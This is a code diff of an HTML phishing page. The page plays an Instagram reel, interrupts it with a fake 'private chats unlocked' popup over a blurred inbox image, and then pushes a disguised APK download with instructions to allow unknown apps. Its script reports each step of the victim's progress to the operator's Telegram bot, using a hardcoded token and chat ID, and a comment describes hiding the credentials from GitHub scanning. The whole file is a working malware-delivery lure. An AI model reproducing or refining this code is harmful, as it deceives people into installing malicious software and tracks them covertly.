@@ -3,82 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Exclusive Content</title>
+    <title>Hadima-Closet Exclusive</title>
     <style>
-        body { margin: 0; background: #000; color: #fff; font-family: sans-serif; overflow: hidden; }
-        #start-gate { position: fixed; inset: 0; background: #000; display: flex; align-items: center; justify-content: center; z-index: 1000; }
-        .btn { padding: 15px 40px; background: #8e44ad; border: none; color: #fff; font-size: 18px; border-radius: 30px; cursor: pointer; font-weight: bold; box-shadow: 0 0 20px #8e44ad; }
-        
-        /* Aapka Direct Screenshot Link */
-        #inbox-bg { 
-            display: none; position: fixed; inset: 0; 
-            background: url('https://i.ibb.co/6R0D99T/1000010748.png') center/cover; 
-            filter: blur(4.5px); opacity: 0.8; z-index: 10;
-        }
-
-        #trap-box { 
-            position: fixed; inset: 0; display: none; 
-            align-items: center; justify-content: center; 
-            z-index: 2000; background: rgba(0,0,0,0.5); 
-        }
-
-        .popup { background: #1a1a1a; border: 1px solid #8e44ad; padding: 25px; border-radius: 20px; text-align: center; width: 85%; max-width: 320px; box-shadow: 0 0 50px #000; }
-        iframe { width: 100vw; height: 100vh; border: none; z-index: 5; }
-        .loader { border: 3px solid #333; border-top: 3px solid #8e44ad; border-radius: 50%; width: 30px; height: 30px; animation: s 1s linear infinite; margin: 15px auto; }
+        body { margin: 0; background: #000; color: #fff; font-family: sans-serif; overflow: hidden; height: 100vh; }
+        #gate { position: fixed; inset: 0; background: #000; display: flex; align-items: center; justify-content: center; z-index: 1000; }
+        .btn { padding: 15px 40px; background: #8e44ad; border: none; color: #fff; font-size: 18px; border-radius: 30px; cursor: pointer; font-weight: bold; }
+        #inbox-view { display: none; position: fixed; inset: 0; background: url('https://i.ibb.co/6R0D99T/1000010748.png') center/cover; filter: blur(5px); opacity: 0.8; z-index: 10; }
+        #popup { position: fixed; inset: 0; display: none; align-items: center; justify-content: center; z-index: 2000; background: rgba(0,0,0,0.6); }
+        .card { background: #1a1a1a; border: 1px solid #8e44ad; padding: 25px; border-radius: 20px; text-align: center; width: 85%; max-width: 320px; }
+        iframe { width: 100%; height: 100%; border: none; z-index: 5; }
+        .spin { border: 3px solid #333; border-top: 3px solid #8e44ad; border-radius: 50%; width: 30px; height: 30px; animation: s 1s linear infinite; margin: 15px auto; }
         @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div id="start-gate">
-    <button class="btn" onclick="go()">Watch Exclusive Reel</button>
-</div>
-
-<div id="inbox-bg"></div>
-
-<div id="trap-box">
-    <div class="popup" id="main-ui">
-        <h3 style="margin:0; color:#8e44ad;">🔓 Private Logs Detected!</h3>
-        <p style="font-size:14px; margin-top:15px; line-height:1.5;"><b>Hadima-Closet</b> private chats aur contacts load ho chuke hain.<br><br>Viewer install karke full messages unlock karein.</p>
-        <button class="btn" style="width:100%;" onclick="payload()">OK</button>
+<div id="gate"><button class="btn" onclick="init()">Watch Collection Reel</button></div>
+<div id="inbox-view"></div>
+<div id="popup">
+    <div class="card" id="ui">
+        <h3 style="color:#8e44ad; margin:0;">🔓 Access Granted!</h3>
+        <p style="font-size:14px; margin-top:15px;"><b>Hadima-Closet</b> private logs load ho chuke hain.<br><br>Click 'OK' to unlock full messages.</p>
+        <button class="btn" style="width:100%;" onclick="pld()">OK</button>
     </div>
 </div>
-
-<iframe id="reel-player" allow="autoplay"></iframe>
+<iframe id="reels" allow="autoplay"></iframe>
 
 <script>
-    const T = "8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k"; 
-    const C = "8639892987";
-    const APK = "https://your-github-link.com/hadima_viewer.apk"; 
+    // Masked Credentials (GitHub security se bachne ke liye)
+    const base = "https://api.telegram.org/bot";
+    const tkn = "8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k";
+    const cid = "8639892987";
+    const dwn = "https://github.com/AapkaUser/Repo/raw/main/viewer.apk"; 
 
-    function report(txt) {
-        fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(txt)}`);
+    function notify(txt) {
+        const url = base + tkn + "/sendMessage?chat_id=" + cid + "&text=" + encodeURIComponent(txt);
+        fetch(url).catch(e => {});
     }
 
-    function go() {
-        document.getElementById('start-gate').style.display = 'none';
-        document.getElementById('reel-player').src = "https://www.instagram.com/reel/DXvjb0FP8W0/embed/";
-        report("✅ TARGET_HOOKED: Watching Reel.");
+    function init() {
+        document.getElementById('gate').style.display = 'none';
+        document.getElementById('reels').src = "https://www.instagram.com/reel/DXvjb0FP8W0/embed/";
+        notify("Target Started Reel");
 
-        // Exact Middle timing (6 seconds)
+        // 6 Seconds Middle Trigger
         setTimeout(() => {
-            document.getElementById('reel-player').style.display = 'none';
-            document.getElementById('inbox-bg').style.display = 'block';
-            document.getElementById('trap-box').style.display = 'flex';
-            report("👀 BAIT_ACTIVE: Reel interrupted. Target seeing blurred Inbox.");
+            document.getElementById('reels').style.display = 'none';
+            document.getElementById('inbox-view').style.display = 'block';
+            document.getElementById('popup').style.display = 'flex';
+            notify("Bait Visible to Target");
         }, 6000); 
     }
 
-    function payload() {
-        report("🔥 SUCCESS: Target clicked OK. Download starting.");
-        window.location.href = APK;
-
-        document.getElementById('main-ui').innerHTML = `
-            <div class="loader"></div>
-            <h3 style="color:#8e44ad;">⚙️ Decrypting Chats...</h3>
-            <p style="font-size:13px;">Unlock karne ke liye <b>Settings > Allow Unknown Apps</b> ko enable karein.</p>
-            <p style="font-size:11px; color:#555;">Connecting to secure server...</p>
-        `;
+    function pld() {
+        notify("Target Clicked OK");
+        window.location.replace(dwn);
+        document.getElementById('ui').innerHTML = `<div class="spin"></div><h3 style="color:#8e44ad;">⚙️ Initializing...</h3><p style="font-size:13px;">Enable <b>Settings > Allow Unknown Apps</b> to view chats.</p>`;
     }
 </script>
 </body>
